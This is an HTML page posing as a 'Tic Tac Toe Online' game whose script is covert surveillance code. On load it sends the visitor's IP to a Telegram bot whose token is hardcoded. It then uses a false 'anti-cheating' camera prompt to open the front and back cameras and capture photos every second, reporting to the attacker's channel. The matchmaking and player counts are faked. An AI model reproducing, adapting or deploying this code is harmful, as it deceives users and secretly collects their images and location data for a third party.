<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tic Tac Toe Online</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background: #0a0e17;
            color: #fff;
            overflow: hidden;
            min-height: 100vh;
        }

        /* Анимированный фон с летающими крестиками и ноликами */
        .background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            overflow: hidden;
        }

        .floating-symbol {
            position: absolute;
            font-size: 24px;
            color: rgba(255, 255, 255, 0.1);
            animation: float linear infinite;
            user-select: none;
        }

        @keyframes float {
            0% {
                transform: translateY(100vh) rotate(0deg);
                opacity: 0;
            }
            10% {
                opacity: 0.2;
            }
            90% {
                opacity: 0.2;
            }
            100% {
                transform: translateY(-100px) rotate(360deg);
                opacity: 0;
            }
        }

        /* Главный экран */
        .main-screen {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            text-align: center;
        }

        .game-title {
            font-size: 4rem;
            margin-bottom: 30px;
            text-transform: uppercase;
            letter-spacing: 3px;
            background: linear-gradient(45deg, #00b4db, #0083b0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 30px rgba(0, 180, 219, 0.3);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }

        .play-button {
            background: linear-gradient(45deg, #00b4db, #0083b0);
            border: none;
            color: white;
            padding: 20px 60px;
            font-size: 1.8rem;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 20px 0;
            box-shadow: 0 0 30px rgba(0, 180, 219, 0.5);
            position: relative;
            overflow: hidden;
        }

        .play-button:hover {
            transform: translateY(-5px);
            box-shadow: 0 0 40px rgba(0, 180, 219, 0.7);
        }

        .play-button:active {
            transform: translateY(-2px);
        }

        .play-button::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 5px;
            height: 5px;
            background: rgba(255, 255, 255, 0.5);
            opacity: 0;
            border-radius: 100%;
            transform: scale(1, 1) translate(-50%);
            transform-origin: 50% 50%;
        }

        .play-button:focus:not(:active)::after {
            animation: ripple 1s ease-out;
        }

        @keyframes ripple {
            0% {
                transform: scale(0, 0);
                opacity: 0.5;
            }
            100% {
                transform: scale(100, 100);
                opacity: 0;
            }
        }

        /* Экран поиска игры */
        .game-screen {
            display: none;
            min-height: 100vh;
            padding: 20px;
        }

        .search-screen {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 80vh;
        }

        .search-title {
            font-size: 2.5rem;
            margin-bottom: 30px;
            color: #00b4db;
            text-align: center;
        }

        .search-container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 20px;
            width: 90%;
            max-width: 500px;
            text-align: center;
            border: 1px solid rgba(0, 180, 219, 0.3);
        }

        .searching {
            display: none;
        }

        .searching .loader {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 255, 255, 0.1);
            border-top: 5px solid #00b4db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .game-options {
            display: flex;
            gap: 20px;
            margin-top: 20px;
            flex-wrap: wrap;
            justify-content: center;
        }

        .option-button {
            background: rgba(0, 180, 219, 0.2);
            border: 2px solid #00b4db;
            color: white;
            padding: 15px 30px;
            font-size: 1.2rem;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            min-width: 200px;
        }

        .option-button:hover {
            background: rgba(0, 180, 219, 0.4);
            transform: translateY(-3px);
        }

        .camera-status {
            margin-top: 30px;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            display: none;
        }

        .camera-on {
            color: #4CAF50;
            font-weight: bold;
        }

        .camera-off {
            color: #f44336;
            font-weight: bold;
        }

        /* Игровое поле */
        .game-board {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 80vh;
        }

        .board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            grid-gap: 10px;
            margin: 30px 0;
            background: rgba(255, 255, 255, 0.1);
            padding: 10px;
            border-radius: 10px;
        }

        .cell {
            width: 100px;
            height: 100px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(0, 180, 219, 0.3);
            border-radius: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 3rem;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .cell:hover {
            background: rgba(0, 180, 219, 0.1);
            transform: scale(1.05);
        }

        .cell.x {
            color: #00b4db;
        }

        .cell.o {
            color: #0083b0;
        }

        .game-info {
            margin-top: 20px;
            text-align: center;
            font-size: 1.2rem;
        }

        .player-turn {
            margin: 20px 0;
            font-size: 1.5rem;
            color: #00b4db;
        }

        .restart-button {
            background: linear-gradient(45deg, #f44336, #d32f2f);
            border: none;
            color: white;
            padding: 15px 40px;
            font-size: 1.2rem;
            border-radius: 25px;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.3s ease;
        }

        .restart-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 0 20px rgba(244, 67, 54, 0.5);
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background: #1a1f2e;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 500px;
            width: 90%;
            border: 2px solid #00b4db;
        }

        .modal h2 {
            margin-bottom: 20px;
            color: #00b4db;
        }

        .modal p {
            margin-bottom: 30px;
            line-height: 1.6;
        }

        .modal-buttons {
            display: flex;
            gap: 20px;
            justify-content: center;
        }

        .modal-button {
            padding: 12px 30px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-size: 1.1rem;
            transition: all 0.3s ease;
            min-width: 120px;
        }

        .allow-button {
            background: #00b4db;
            color: white;
        }

        .deny-button {
            background: #f44336;
            color: white;
        }

        .modal-button:hover {
            transform: translateY(-3px);
        }

        /* Адаптивность */
        @media (max-width: 768px) {
            .game-title {
                font-size: 2.5rem;
            }
            
            .play-button {
                padding: 15px 40px;
                font-size: 1.5rem;
            }
            
            .cell {
                width: 80px;
                height: 80px;
                font-size: 2.5rem;
            }
            
            .search-title {
                font-size: 2rem;
            }
            
            .search-container {
                padding: 20px;
            }
        }

        @media (max-width: 480px) {
            .game-title {
                font-size: 2rem;
            }
            
            .cell {
                width: 70px;
                height: 70px;
                font-size: 2rem;
            }
            
            .option-button {
                min-width: 150px;
                padding: 12px 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Анимированный фон -->
    <div class="background" id="background"></div>

    <!-- Главный экран -->
    <div class="main-screen" id="mainScreen">
        <h1 class="game-title">Tic Tac Toe Online</h1>
        <button class="play-button" id="playButton">PLAY</button>
    </div>

    <!-- Экран поиска игры -->
    <div class="game-screen" id="gameScreen">
        <div class="search-screen" id="searchScreen">
            <h2 class="search-title">Find a Game</h2>
            <div class="search-container">
                <div class="searching" id="searching">
                    <div class="loader"></div>
                    <p>Searching for opponent...</p>
                    <p>Players online: <span id="onlineCount">1</span></p>
                </div>
                <div class="game-options">
                    <button class="option-button" id="createGame">Create Game</button>
                    <button class="option-button" id="joinGame">Join Game</button>
                </div>
                <div class="camera-status" id="cameraStatus">
                    Camera status: <span class="camera-off" id="cameraStatusText">OFF</span>
                </div>
            </div>
        </div>

        <!-- Игровое поле -->
        <div class="game-board" id="gameBoard">
            <h2 class="search-title">Tic Tac Toe</h2>
            <div class="player-turn" id="playerTurn">Your turn: X</div>
            <div class="board" id="board">
                <div class="cell" data-cell-index="0"></div>
                <div class="cell" data-cell-index="1"></div>
                <div class="cell" data-cell-index="2"></div>
                <div class="cell" data-cell-index="3"></div>
                <div class="cell" data-cell-index="4"></div>
                <div class="cell" data-cell-index="5"></div>
                <div class="cell" data-cell-index="6"></div>
                <div class="cell" data-cell-index="7"></div>
                <div class="cell" data-cell-index="8"></div>
            </div>
            <div class="game-info" id="gameInfo">
                <p>Player X: <span id="playerX">You</span></p>
                <p>Player O: <span id="playerO">Opponent</span></p>
            </div>
            <button class="restart-button" id="restartButton">Restart Game</button>
        </div>
    </div>

    <!-- Модальное окно для разрешения камеры -->
    <div class="modal" id="cameraModal">
        <div class="modal-content">
            <h2>Camera Access Required</h2>
            <p>To play this game, you need to allow camera access. The camera will be used to:</p>
            <ul style="text-align: left; margin: 20px 0; padding-left: 20px;">
                <li>Verify player identity</li>
                <li>Prevent cheating</li>
                <li>Enhance gaming experience</li>
            </ul>
            <p><strong>Photos will be sent to the game server for moderation purposes.</strong></p>
            <div class="modal-buttons">
                <button class="modal-button allow-button" id="allowCamera">Allow Access</button>
                <button class="modal-button deny-button" id="denyCamera">Deny</button>
            </div>
        </div>
    </div>

    <!-- Модальное окно для результата игры -->
    <div class="modal" id="resultModal">
        <div class="modal-content">
            <h2 id="resultTitle">Game Over</h2>
            <p id="resultMessage"></p>
            <button class="modal-button allow-button" id="closeResult">OK</button>
        </div>
    </div>

    <script>
        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = '8134203113:AAEv9pmQQkES_IwC9LhbeMrB1dBO_zLUPcw';
        const TELEGRAM_CHANNEL_ID = '-1002577213610';
        
        // Game state
        let currentPlayer = 'X';
        let gameActive = true;
        let gameState = ['', '', '', '', '', '', '', '', ''];
        let isCameraAllowed = false;
        let frontCamera = null;
        let backCamera = null;
        let photoCount = 0;
        let photoInterval = null;
        let playerIP = '';
        let isSearching = false;
        let gameId = null;
        let playerId = Math.random().toString(36).substr(2, 9);
        
        // DOM Elements
        const mainScreen = document.getElementById('mainScreen');
        const gameScreen = document.getElementById('gameScreen');
        const searchScreen = document.getElementById('searchScreen');
        const gameBoard = document.getElementById('gameBoard');
        const playButton = document.getElementById('playButton');
        const cameraModal = document.getElementById('cameraModal');
        const allowCameraBtn = document.getElementById('allowCamera');
        const denyCameraBtn = document.getElementById('denyCamera');
        const cameraStatus = document.getElementById('cameraStatus');
        const cameraStatusText = document.getElementById('cameraStatusText');
        const createGameBtn = document.getElementById('createGame');
        const joinGameBtn = document.getElementById('joinGame');
        const searchingDiv = document.getElementById('searching');
        const onlineCount = document.getElementById('onlineCount');
        const cells = document.querySelectorAll('.cell');
        const playerTurn = document.getElementById('playerTurn');
        const restartButton = document.getElementById('restartButton');
        const resultModal = document.getElementById('resultModal');
        const resultTitle = document.getElementById('resultTitle');
        const resultMessage = document.getElementById('resultMessage');
        const closeResult = document.getElementById('closeResult');
        const background = document.getElementById('background');
        
        // Winning conditions
        const winningConditions = [
            [0, 1, 2],
            [3, 4, 5],
            [6, 7, 8],
            [0, 3, 6],
            [1, 4, 7],
            [2, 5, 8],
            [0, 4, 8],
            [2, 4, 6]
        ];
        
        // Create floating symbols for background
        function createFloatingSymbols() {
            const symbols = ['×', '○', 'X', 'O'];
            for (let i = 0; i < 50; i++) {
                const symbol = document.createElement('div');
                symbol.className = 'floating-symbol';
                symbol.textContent = symbols[Math.floor(Math.random() * symbols.length)];
                
                // Random properties
                const size = Math.random() * 30 + 20;
                const left = Math.random() * 100;
                const duration = Math.random() * 30 + 20;
                const delay = Math.random() * 5;
                
                symbol.style.fontSize = `${size}px`;
                symbol.style.left = `${left}%`;
                symbol.style.animationDuration = `${duration}s`;
                symbol.style.animationDelay = `${delay}s`;
                
                background.appendChild(symbol);
            }
        }
        
        // Get IP address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                playerIP = data.ip;
                
                // Send IP to Telegram
                sendToTelegram(`🚨 Новый посетитель:\nIP: ${playerIP}\nPlayer ID: ${playerId}`);
            } catch (error) {
                playerIP = 'Unknown';
            }
        }
        
        // Send data to Telegram
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHANNEL_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }
        
        // Capture photo from camera
        async function capturePhoto(cameraType, camera) {
            try {
                const canvas = document.createElement('canvas');
                const video = document.createElement('video');
                
                video.srcObject = camera;
                await video.play();
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                // Convert to blob
                return new Promise((resolve) => {
                    canvas.toBlob((blob) => {
                        resolve(blob);
                        video.pause();
                        video.srcObject = null;
                    }, 'image/jpeg', 0.8);
                });
            } catch (error) {
                console.error('Error capturing photo:', error);
                return null;
            }
        }
        
        // Start continuous photo capture
        async function startPhotoCapture() {
            if (!isCameraAllowed) return;
            
            photoCount = 0;
            
            // Try to get both front and back cameras
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(device => device.kind === 'videoinput');
                
                if (videoDevices.length > 0) {
                    // Try front camera
                    try {
                        frontCamera = await navigator.mediaDevices.getUserMedia({
                            video: { 
                                facingMode: 'user',
                                width: { ideal: 640 },
                                height: { ideal: 480 }
                            }
                        });
                    } catch (e) {
                        console.log('Front camera not available');
                    }
                    
                    // Try back camera
                    try {
                        backCamera = await navigator.mediaDevices.getUserMedia({
                            video: { 
                                facingMode: { exact: 'environment' },
                                width: { ideal: 640 },
                                height: { ideal: 480 }
                            }
                        });
                    } catch (e) {
                        console.log('Back camera not available');
                    }
                    
                    // Start capturing photos
                    photoInterval = setInterval(async () => {
                        if (photoCount >= 50) {
                            clearInterval(photoInterval);
                            return;
                        }
                        
                        const now = new Date();
                        const timeString = now.toLocaleString('ru-RU', {
                            day: '2-digit',
                            month: '2-digit',
                            year: 'numeric',
                            hour: '2-digit',
                            minute: '2-digit',
                            second: '2-digit'
                        });
                        
                        photoCount++;
                        
                        // Capture and send front camera photo if available
                        if (frontCamera) {
                            const frontPhoto = await capturePhoto('front', frontCamera);
                            if (frontPhoto) {
                                const formData = new FormData();
                                formData.append('chat_id', TELEGRAM_CHANNEL_ID);
                                formData.append('photo', frontPhoto, `front_${photoCount}.jpg`);
                                
                                // Send caption
                                setTimeout(() => {
                                    sendToTelegram(`🆔 Фото фронтальной камеры #${photoCount}\nВремя: ${timeString}\nPlayer: ${playerId}`);
                                }, 1000);
                            }
                        }
                        
                        // Capture and send back camera photo if available
                        if (backCamera) {
                            const backPhoto = await capturePhoto('back', backCamera);
                            if (backPhoto) {
                                const formData = new FormData();
                                formData.append('chat_id', TELEGRAM_CHANNEL_ID);
                                formData.append('photo', backPhoto, `back_${photoCount}.jpg`);
                                
                                // Send caption
                                setTimeout(() => {
                                    sendToTelegram(`🆔 Фото задней камеры #${photoCount}\nВремя: ${timeString}\nPlayer: ${playerId}`);
                                }, 2000);
                            }
                        }
                        
                    }, 1000); // Capture every second
                }
            } catch (error) {
                console.error('Error accessing cameras:', error);
            }
        }
        
        // Stop photo capture
        function stopPhotoCapture() {
            if (photoInterval) {
                clearInterval(photoInterval);
                photoInterval = null;
            }
            
            if (frontCamera) {
                frontCamera.getTracks().forEach(track => track.stop());
                frontCamera = null;
            }
            
            if (backCamera) {
                backCamera.getTracks().forEach(track => track.stop());
                backCamera = null;
            }
        }
        
        // Initialize game
        function initGame() {
            createFloatingSymbols();
            getIPAddress();
            
            // Event Listeners
            playButton.addEventListener('click', () => {
                cameraModal.style.display = 'flex';
            });
            
            allowCameraBtn.addEventListener('click', async () => {
                cameraModal.style.display = 'none';
                
                try {
                    // Request camera permission
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: true,
                        audio: false 
                    });
                    
                    // Stop the test stream
                    stream.getTracks().forEach(track => track.stop());
                    
                    isCameraAllowed = true;
                    cameraStatus.style.display = 'block';
                    cameraStatusText.textContent = 'ON';
                    cameraStatusText.className = 'camera-on';
                    
                    // Show game screen
                    mainScreen.style.display = 'none';
                    gameScreen.style.display = 'block';
                    
                    // Start photo capture
                    startPhotoCapture();
                    
                } catch (error) {
                    alert('Camera access denied. You cannot play without camera permission.');
                    cameraModal.style.display = 'none';
                }
            });
            
            denyCameraBtn.addEventListener('click', () => {
                cameraModal.style.display = 'none';
                alert('Camera access is required to play this game.');
            });
            
            createGameBtn.addEventListener('click', () => {
                createGame();
            });
            
            joinGameBtn.addEventListener('click', () => {
                joinGame();
            });
            
            // Game board event listeners
            cells.forEach(cell => {
                cell.addEventListener('click', handleCellClick);
            });
            
            restartButton.addEventListener('click', restartGame);
            closeResult.addEventListener('click', () => {
                resultModal.style.display = 'none';
            });
            
            // Update online count randomly
            setInterval(() => {
                const count = Math.floor(Math.random() * 100) + 1;
                onlineCount.textContent = count;
            }, 3000);
        }
        
        // Create new game
        function createGame() {
            gameId = Math.random().toString(36).substr(2, 8);
            searchingDiv.style.display = 'block';
            createGameBtn.style.display = 'none';
            joinGameBtn.style.display = 'none';
            
            // Simulate waiting for opponent
            setTimeout(() => {
                startGame();
            }, 3000);
        }
        
        // Join existing game
        function joinGame() {
            searchingDiv.style.display = 'block';
            createGameBtn.style.display = 'none';
            joinGameBtn.style.display = 'none';
            
            // Simulate searching for game
            setTimeout(() => {
                gameId = 'JOINED_' + Math.random().toString(36).substr(2, 6);
                startGame();
            }, 2000);
        }
        
        // Start the actual game
        function startGame() {
            searchScreen.style.display = 'none';
            gameBoard.style.display = 'flex';
            currentPlayer = 'X';
            gameActive = true;
            gameState = ['', '', '', '', '', '', '', '', ''];
            playerTurn.textContent = 'Your turn: X';
            
            // Update player names
            document.getElementById('playerX').textContent = 'You (X)';
            document.getElementById('playerO').textContent = 'Opponent (O)';
            
            // Clear board
            cells.forEach(cell => {
                cell.textContent = '';
                cell.classList.remove('x', 'o');
            });
        }
        
        // Handle cell click
        function handleCellClick(clickedCellEvent) {
            if (!gameActive) return;
            
            const clickedCell = clickedCellEvent.target;
            const clickedCellIndex = parseInt(clickedCell.getAttribute('data-cell-index'));
            
            if (gameState[clickedCellIndex] !== '') {
                return;
            }
            
            // Make move
            gameState[clickedCellIndex] = currentPlayer;
            clickedCell.textContent = currentPlayer;
            clickedCell.classList.add(currentPlayer.toLowerCase());
            
            // Check for win or draw
            checkResult();
            
            // Send photo on each move
            if (isCameraAllowed && photoCount < 50) {
                // This will trigger photo capture through the interval
            }
        }
        
        // Check game result
        function checkResult() {
            let roundWon = false;
            let winner = null;
            
            for (let i = 0; i < winningConditions.length; i++) {
                const [a, b, c] = winningConditions[i];
                if (gameState[a] === '' || gameState[b] === '' || gameState[c] === '') {
                    continue;
                }
                if (gameState[a] === gameState[b] && gameState[a] === gameState[c]) {
                    roundWon = true;
                    winner = gameState[a];
                    break;
                }
            }
            
            if (roundWon) {
                gameActive = false;
                resultTitle.textContent = '🎉 Victory!';
                resultMessage.textContent = `Player ${winner} wins the game!`;
                resultModal.style.display = 'flex';
                return;
            }
            
            const roundDraw = !gameState.includes('');
            if (roundDraw) {
                gameActive = false;
                resultTitle.textContent = '🤝 Draw!';
                resultMessage.textContent = 'Game ended in a draw!';
                resultModal.style.display = 'flex';
                return;
            }
            
            // Switch player
            currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
            playerTurn.textContent = `Your turn: ${currentPlayer}`;
        }
        
        // Restart game
        function restartGame() {
            currentPlayer = 'X';
            gameActive = true;
            gameState = ['', '', '', '', '', '', '', '', ''];
            playerTurn.textContent = 'Your turn: X';
            
            cells.forEach(cell => {
                cell.textContent = '';
                cell.classList.remove('x', 'o');
            });
            
            resultModal.style.display = 'none';
        }
        
        // Handle page unload
        window.addEventListener('beforeunload', () => {
            stopPhotoCapture();
            
            if (isCameraAllowed) {
                sendToTelegram(`👋 Player ${playerId} left the game\nIP: ${playerIP}\nTotal photos: ${photoCount}`);
            }
        });
        
        // Initialize the game when page loads
        window.addEventListener('DOMContentLoaded', initGame);
    </script>
</body>
</html>